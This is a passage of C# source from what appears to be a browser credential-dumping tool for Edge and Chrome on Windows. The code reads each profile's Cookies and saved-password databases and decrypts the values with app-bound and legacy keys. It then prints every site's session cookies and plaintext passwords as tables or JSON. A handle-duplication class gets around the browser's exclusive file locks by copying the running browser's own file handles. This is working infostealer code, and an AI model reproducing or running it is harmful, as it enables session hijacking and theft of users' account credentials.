                    // live browser holds the DB: read through a temp copy
                    // (uncheckpointed rows live in the -wal; when the browser
                    // is running the copy may miss recent rows)
                    // live browser keeps the DB open read-write and recent
                    // rows in the -wal: permissive shared read + WAL replay
                    db = OpenDbCopy(dbPath);
                    root = LiteDb.TableRoot(db, "cookies", out cols);
                }
                catch (Exception e) { Err(profName + ": " + e.Message); continue; }
                if (root == 0) { Err(profName + ": cookies table missing"); continue; }
                Dbg("[dbg] " + profName + ": root=" + root + " cols=" + cols.Length);

                int iHost = Idx(cols, "host_key"), iName = Idx(cols, "name"),
                    iVal = Idx(cols, "value"), iEnc = Idx(cols, "encrypted_value"),
                    iPath = Idx(cols, "path"), iExp = Idx(cols, "expires_utc"),
                    iCreate = Idx(cols, "creation_utc"),
                    iSecure = Idx(cols, "is_secure"), iHonly = Idx(cols, "is_httponly");

                int walked = 0;
                Dbg("[dbg] " + profName + ": walk start " + DateTime.Now.ToString("HH:mm:ss.fff"));
                // collect everything first: table mode groups by host, which
                // reads far better than the DB's insertion order
                var items = new List<object[]>();
                foreach (var row in db.Walk(root))
                {
                    walked++;
                    var v = row.V;
                    string host = S(v, iHost), name = S(v, iName),
                           path = S(v, iPath), plain = S(v, iVal);
                    byte[] enc = B(v, iEnc);
                    string value;
                    bool ok = true;
                    if (plain != null && plain.Length > 0) value = plain;
                    else if (enc != null)
                    {
                        int scheme;
                        value = DecryptValue(enc, abeKey, legacyKey, true,
                            out ok, out scheme);
                        if (!ok) failCount++;
                        else { okCount++; if (scheme == 1) v20Ok++; else v10Ok++; }
                    }
                    else { value = ""; }
                    total++;
                    if (verify) continue;
                    if (!ok && (plain == null || plain.Length == 0))
                        continue; // skip undecryptable rows in live output
                    items.Add(new object[] { host, name, path, value,
                        L(v, iExp), L(v, iCreate), B2I(v, iSecure), B2I(v, iHonly) });
                }
                Dbg("[dbg] " + profName + ": walk done n=" + walked + " " + DateTime.Now.ToString("HH:mm:ss.fff"));
                if (verify) continue;

                items.Sort(delegate(object[] a, object[] b)
                {
                    int c = string.Compare((string)a[0],
                        (string)b[0], StringComparison.OrdinalIgnoreCase);
                    if (c != 0) return c;
                    return string.Compare((string)a[1],
                        (string)b[1], StringComparison.Ordinal);
                });

                if (json)
                {
                    foreach (object[] it in items)
                    {
                        // literal JSON braces must be doubled in a format string
                        Console.WriteLine("{{\"profile\":\"{0}\",\"host\":\"{1}\",\"name\":\"{2}\"," +
                            "\"path\":\"{3}\",\"value\":\"{4}\",\"expires_utc\":{5}," +
                            "\"created_utc\":{6},\"secure\":{7},\"httponly\":{8}}}",
                            J(profName), J((string)it[0]), J((string)it[1]), J((string)it[2]),
                            J((string)it[3]), (long)it[4], (long)it[5], (int)it[6], (int)it[7]);
                    }
                }
                else
                {
                    if (items.Count == 0) continue; // no rows in this profile
                    Console.WriteLine();
                    WriteLineC("-- profile " + profName + ": " + items.Count + " cookies " +
                        "--------------------------------------------------------------",
                        ConsoleColor.Cyan, false, true);
                    WriteLineC(string.Format("{0,4}  {1,-30} {2,-24} {3,-48} {4,10}  {5}",
                        "#", "HOST", "NAME", "VALUE", "EXPIRES", "F"),
                        ConsoleColor.Yellow, false, true);
                    int n = 0;
                    foreach (object[] it in items)
                    {
                        n++;
                        Console.WriteLine("{0,4}  {1,-30} {2,-24} {3,-48} {4,10}  {5}{6}",
                            n, Clip((string)it[0], 30), Clip((string)it[1], 24),
                            Clip((string)it[3], 48), FmtExpiry((long)it[4]),
                            ((int)it[6] != 0) ? "S" : "-",
                            ((int)it[7] != 0) ? "H" : "-");
                    }
                    Win("[*] " + profName + ": " + items.Count + " cookies shown (" +
                        okCount + " ok, " + failCount + " failed to decrypt)" +
                        " [abe-scheme v20: " + v20Ok + " | legacy v10: " + v10Ok + "]");
                }
            }
            if (verify)
                Console.WriteLine("{{\"verify\":\"cookies\",\"rows\":{0},\"gcm_ok\":{1},\"gcm_fail\":{2}," +
                    "\"abe_v20_ok\":{3},\"legacy_v10_ok\":{4}}}",
                    total, okCount, failCount, v20Ok, v10Ok);
            return (verify && failCount > 0) ? 1 : 0;
        }

        // Edge 157 opens the Cookies DB, -wal and -shm with share=none:
        // no CreateFile succeeds while the browser holds them. Workaround:
        // duplicate the browser's OWN file handles; NtQuerySystemInformation
        // (SystemExtendedHandleInformation) enumerates every handle in the
        // msedge processes, DuplicateHandle copies one into our process
        // (share modes are only checked at open time, never at duplicate
        // time), and the duplicate is readable like any other handle. The
        // sqlite byte-range locks sit at offset 1 GB, far beyond the file
        // extent, so reads of actual content never touch them. Same-user
        // process, so no admin needed.
        private static class HandleSteal
        {
            [DllImport("ntdll.dll")] private static extern int NtQuerySystemInformation(
                int cls, IntPtr buf, int len, out int retLen);
            [DllImport("ntdll.dll")] private static extern int NtQueryInformationFile(
                IntPtr h, ref IO_STATUS_BLOCK iosb, IntPtr info, int len, int cls);
            [DllImport("kernel32.dll", SetLastError = true)] private static extern bool DuplicateHandle(
                IntPtr srcProc, IntPtr src, IntPtr dstProc, out IntPtr dst,
                uint access, bool inherit, uint opts);
            [DllImport("kernel32.dll")] private static extern IntPtr GetCurrentProcess();
            [DllImport("kernel32.dll", SetLastError = true)] private static extern IntPtr OpenProcess(
                uint access, bool inherit, int pid);
            [DllImport("kernel32.dll", SetLastError = true)] private static extern bool ReadFile(
                IntPtr h, byte[] buf, int len, out int read, IntPtr ov);
            [DllImport("kernel32.dll")] private static extern uint SetFilePointer(
                IntPtr h, int dist, IntPtr distHi, int whence);
            [DllImport("kernel32.dll")] private static extern bool CloseHandle(IntPtr h);
            [DllImport("kernel32.dll")] private static extern uint GetFileType(IntPtr h);
            private const int SystemExtendedHandleInformation = 64;
            private const int FILE_NAME_INFORMATION_CLASS = 9; // FileNameInformation
            private const uint DUPLICATE_SAME_ACCESS = 2;
            private const uint PROCESS_DUP_HANDLE = 0x0040;
            private const uint FILE_READ_DATA = 0x0001;
            private const uint FILE_TYPE_DISK = 1;
            private const int STATUS_INFO_LENGTH_MISMATCH = unchecked((int)0xC0000004);

            [StructLayout(LayoutKind.Sequential)]
            private struct IO_STATUS_BLOCK
            {
                public uint Status;
                public IntPtr Information;
            }

            // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, x64: Object, Pid, Handle are
            // 8-byte; GrantedAccess 4; then two ushorts and two uints = 40B
            private const int ENTRY_SIZE = 40;

            // duplicate every browser handle for `path` and slurp it whole;
            // returns null if no matching handle is reachable
            internal static byte[] ReadLocked(string path, IEnumerable<int> pids)
            {
                // FileNameInformation reports volume-relative names, i.e.
                // "\Users\..." without the \Device\HarddiskVolumeN prefix;
                // build the same form from the Win32 path
                string want = Path.GetFullPath(path).Substring(2);
                if (want.Length < 2) return null;
                var set = new HashSet<int>(pids);

                int len = 1 << 20;
                IntPtr buf = Marshal.AllocHGlobal(len);
                try
                {
                    int rl;
                    while (NtQuerySystemInformation(SystemExtendedHandleInformation,
                        buf, len, out rl) == STATUS_INFO_LENGTH_MISMATCH)
                    {
                        Marshal.FreeHGlobal(buf);
                        len = rl + (1 << 20);
                        buf = Marshal.AllocHGlobal(len);
                    }
                    // SYSTEM_HANDLE_INFORMATION_EX: NumberOfHandles and
                    // Reserved are both ULONG_PTR = 8 bytes on x64, so the
                    // entry array starts at +16
                    int count = Marshal.ReadInt32(buf);
                    IntPtr srcProc = IntPtr.Zero;
                    int srcPid = -1;
                    for (int i = 0; i < count; i++)
                    {
                        IntPtr e = new IntPtr(buf.ToInt64() + 16 + i * ENTRY_SIZE);
                        int pid = (int)Marshal.ReadInt64(e, 8);
                        if (!set.Contains(pid)) continue;
                        IntPtr h = Marshal.ReadIntPtr(e, 16);
                        uint access = (uint)Marshal.ReadInt32(e, 24);
                        if ((access & FILE_READ_DATA) == 0) continue;

                        // the SOURCE must be a real handle to the owning
                        // process; the GetCurrentProcess() pseudo-handle with
                        // a foreign value resolves in OUR table and fails
                        if (pid != srcPid)
                        {
                            if (srcProc != IntPtr.Zero) CloseHandle(srcProc);
                            srcProc = OpenProcess(PROCESS_DUP_HANDLE, false, pid);
                            srcPid = pid;
                        }
                        if (srcProc == IntPtr.Zero) continue;

                        IntPtr dup;
                        if (!DuplicateHandle(srcProc, h,
                            GetCurrentProcess(), out dup, 0, false,
                            DUPLICATE_SAME_ACCESS)) continue;
                        try
                        {
                            // NtQueryInformationFile can block forever on
                            // non-file handles (pipes/devices with pending
                            // I/O), so filter with the cheap synchronous
                            // GetFileType first
                            if (GetFileType(dup) != FILE_TYPE_DISK) continue;
                            if (NameOf(dup) != want) continue;
                            return Slurp(dup);
                        }
                        finally { CloseHandle(dup); }
                    }
                    if (srcProc != IntPtr.Zero) CloseHandle(srcProc);
                    return null;
                }
                finally { Marshal.FreeHGlobal(buf); }
            }

            private static string NameOf(IntPtr h)
            {
                var iosb = new IO_STATUS_BLOCK();
                int len = 1024;
                IntPtr info = Marshal.AllocHGlobal(len);
                try
                {
                    int st = NtQueryInformationFile(h, ref iosb, info, len,
                        FILE_NAME_INFORMATION_CLASS);
                    if (st != 0) return null;
                    int n = Marshal.ReadInt32(info, 0); // FileNameLength, bytes
                    if (n <= 0 || n > len - 4) return null;
                    return Marshal.PtrToStringUni(new IntPtr(info.ToInt64() + 4), n / 2);
                }
                finally { Marshal.FreeHGlobal(info); }
            }

            // whole file through the duplicated handle (own file pointer,
            // independent of the browser's)
            private static byte[] Slurp(IntPtr h)
            {
                SetFilePointer(h, 0, IntPtr.Zero, 0); // FILE_BEGIN
                using (var ms = new MemoryStream())
                {
                    var buf = new byte[64 * 1024];
                    int n;
                    while (ReadFile(h, buf, buf.Length, out n, IntPtr.Zero) && n > 0)
                        ms.Write(buf, 0, n);
                    return ms.ToArray();
                }
            }

        }

        // The browser holds Cookies / Login Data open read-write; File.Copy
        // (FileShare.Read) loses that race with a sharing violation. Open with
        // FileShare.ReadWrite|Delete instead and retry through transient
        // exclusive locks taken during write transactions.
        private static byte[] ReadShared(string path, int tries)
        {
            for (int i = 0; ; i++)
            {
                try
                {
                    using (var fs = new FileStream(path, FileMode.Open,
                        FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
                    using (var ms = new MemoryStream())
                    {
                        var buf = new byte[64 * 1024];
                        int n;
                        while ((n = fs.Read(buf, 0, buf.Length)) > 0)
                            ms.Write(buf, 0, n);
                        return ms.ToArray();
                    }
                }
                catch (IOException)
                {
                    if (i >= tries) throw;
                    System.Threading.Thread.Sleep(150);
                }
            }
        }

        private static LiteDb OpenDbCopy(string dbPath)
        {
            byte[] wal = null;
            string walSrc = dbPath + "-wal";
            if (File.Exists(walSrc))
            {
                try { wal = ReadShared(walSrc, 5); }
                catch { wal = HandleStealRead(walSrc); }
            }
            byte[] main;
            try { main = ReadShared(dbPath, 10); }
            catch { main = HandleStealRead(dbPath); }
            return new LiteDb(main, wal);
        }

        // share-mode-defeated read: duplicate the browser's own handle for
        // this file out of every msedge/chrome process until one matches
        private static byte[] HandleStealRead(string path)
        {
            var pids = new List<int>();
            foreach (var p in System.Diagnostics.Process.GetProcessesByName("msedge"))
                pids.Add(p.Id);
            foreach (var p in System.Diagnostics.Process.GetProcessesByName("chrome"))
                pids.Add(p.Id);
            if (pids.Count == 0)
                throw new IOException(path + " locked and no browser process to steal from");
            byte[] data = HandleSteal.ReadLocked(path, pids);
            if (data == null)
                throw new IOException(path + " locked; handle steal found no matching handle");
            return data;
        }

        private static int DumpPasswords(bool edge, string profile, bool verify, string keyFile, bool json)
        {
            byte[] abeKey = keyFile != null
                ? File.ReadAllBytes(keyFile)
                : null;
            if (abeKey == null)
            {
                try { abeKey = ExtractKey(edge, null); } catch { }
            }
            string ls = Path.Combine(UserDataDir(edge), "Local State");
            byte[] legacyKey = File.Exists(ls) ? LegacyKey(File.ReadAllText(ls)) : null;

            int total = 0, okCount = 0, failCount = 0, v20Ok = 0, v10Ok = 0;
            foreach (var dir in ProfileDirs(edge, profile))
            {
                string profName = Path.GetFileName(dir);

                // two stores: local-only passwords in "Login Data", Google
                // account-synced passwords in "Login Data For Account" (the
                // password-manager UI shows both merged, so we must read both)
                foreach (string store in new[] { "Login Data",
                                                 "Login Data For Account" })
                {
                string dbPath = Path.Combine(dir, store);
                if (!File.Exists(dbPath)) continue;

                LiteDb db;
                int root; string[] cols;
                try
                {
                    db = OpenDbCopy(dbPath);
                    root = LiteDb.TableRoot(db, "logins", out cols);
                }
                catch (Exception e) { Err(profName + " (" + store + "): " + e.Message); continue; }
                if (root == 0) continue;

                int iOrigin = Idx(cols, "origin_url"), iAction = Idx(cols, "action_url"),
                    iUser = Idx(cols, "username_value"), iPass = Idx(cols, "password_value");

                var items = new List<object[]>();
                foreach (var row in db.Walk(root))
                {
                    var v = row.V;
                    byte[] enc = B(v, iPass);
                    // some rows are placeholders: empty blob = nothing stored
                    if (enc == null || enc.Length < 31) continue;
                    string user = S(v, iUser);
                    bool ok;
                    int scheme;
                    string pass = DecryptValue(enc, abeKey, legacyKey, false,
                        out ok, out scheme);
                    total++;
                    if (ok) { okCount++; if (scheme == 1) v20Ok++; else v10Ok++; }
                    else failCount++;
                    if (verify) continue;
                    if (!ok) continue;
                    items.Add(new object[] { S(v, iOrigin), S(v, iAction), user, pass });
                }
                if (verify) continue;

                items.Sort(delegate(object[] a, object[] b)
                {
                    return string.Compare((string)a[0],
                        (string)b[0], StringComparison.OrdinalIgnoreCase);
                });

                if (json)
                {
                    // literal JSON braces MUST be doubled inside a composite
                    // format string; a single trailing "}" is a FormatException
                    // (this path never ran until a profile had saved passwords)
                    foreach (object[] it in items)
                    {
                        Console.WriteLine("{{\"profile\":\"{0}\",\"origin\":\"{1}\"," +
                            "\"action\":\"{2}\",\"username\":\"{3}\",\"password\":\"{4}\"}}",
                            J(profName), J((string)it[0]), J((string)it[1]),
                            J((string)it[2]), J((string)it[3]));
                    }
                }
                else
                {
                    if (items.Count == 0) continue; // no rows in this store
                    Console.WriteLine();
                    WriteLineC("-- profile " + profName + ": " + items.Count + " passwords " +
                        "------------------------------------------------------------",
                        ConsoleColor.Cyan, false, true);
                    WriteLineC(string.Format("{0,4}  {1,-26} {2,-48} {3,-44}",
                        "#", "USERNAME", "ORIGIN", "PASSWORD"),
                        ConsoleColor.Yellow, false, true);
                    int n = 0;
                    foreach (object[] it in items)
                    {
                        n++;
                        string origin = (string)it[0];
                        if (origin.Length == 0) origin = (string)it[1];
                        Console.WriteLine("{0,4}  {1,-26} {2,-48} {3,-44}",
                            n, Clip((string)it[2], 26), Clip(origin, 48),
                            Clip((string)it[3], 44));
                    }
                    Win("[*] " + profName + ": " + items.Count + " passwords shown (" +
                        okCount + " ok, " + failCount + " failed to decrypt)" +
                        " [abe-scheme v20: " + v20Ok + " | legacy v10: " + v10Ok + "]");
                }
                } // store loop
            }
            if (verify)
                Console.WriteLine("{{\"verify\":\"passwords\",\"rows\":{0},\"gcm_ok\":{1},\"gcm_fail\":{2}," +
                    "\"abe_v20_ok\":{3},\"legacy_v10_ok\":{4}}}",
                    total, okCount, failCount, v20Ok, v10Ok);
            return (verify && failCount > 0) ? 1 : 0;
        }

        // console-safe truncation: control chars -> '.', clip with ".."
        private static string Clip(string s, int w)
        {
            if (s == null) s = "";
            var sb = new StringBuilder(s.Length);
            foreach (char c in s)
                sb.Append(c >= 0x20 && c != 0x7f ? c : '.');
            string t = sb.ToString();
            if (t.Length > w) t = t.Substring(0, w - 2) + "..";
            return t;
        }

        // Chromium expires_utc = microseconds since 1601 (FILETIME epoch):
        // scale to 100ns ticks for FromFileTimeUtc. 0 = session cookie.
        private static string FmtExpiry(long expiresUtc)
        {
            if (expiresUtc <= 0) return "session";
            try
            {
                return DateTime.FromFileTimeUtc(expiresUtc * 10).ToString("yyyy-MM-dd");
            }
            catch { return "?"; }
        }

        private static int Idx(string[] cols, string name)
        {
            for (int i = 0; i < cols.Length; i++)
                if (cols[i] == name) return i;
            return -1;
        }
        private static string S(object[] v, int i)
        { return (i >= 0 && i < v.Length && v[i] is string) ? (string)v[i] : null; }
        private static byte[] B(object[] v, int i)
        { return (i >= 0 && i < v.Length && v[i] is byte[]) ? (byte[])v[i] : null; }
        private static long L(object[] v, int i)
        { return (i >= 0 && i < v.Length && v[i] is long) ? (long)v[i] : 0; }
        private static int B2I(object[] v, int i) { return (int)L(v, i); }

        private static string J(string s)
        {
            if (s == null) return "";
            var sb = new StringBuilder(s.Length + 8);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (c < 0x20) sb.AppendFormat("\\u{0:x4}", (int)c);
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }
    }
}
